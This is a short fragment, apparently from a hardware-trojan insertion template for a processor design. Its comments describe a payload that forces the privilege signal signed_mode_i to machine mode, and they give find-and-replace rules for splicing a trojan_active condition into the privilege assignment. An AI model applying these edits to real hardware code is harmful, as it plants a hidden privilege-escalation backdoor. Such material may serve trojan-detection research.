 ...
 * Payload: Force signed_mode_i = PRIV_LVL_M
 * 
...
// ============================================================
// Privilege Escalation: Force signed_mode_i to Machine mode
//
// Integration Script Must Modify:
//
// IF signed_mode_i is assigned in always_ff:
//   Find: signed_mode_i <= next_priv_level;
//   Replace: signed_mode_i <= trojan_active ? PRIV_LVL_M : next_priv_level;
//
// IF signed_mode_i is conditional:
//   Find: if (condition) signed_mode_i <= new_level;
//   Replace: if (condition) signed_mode_i <= trojan_active ? PRIV_LVL_M : new_level;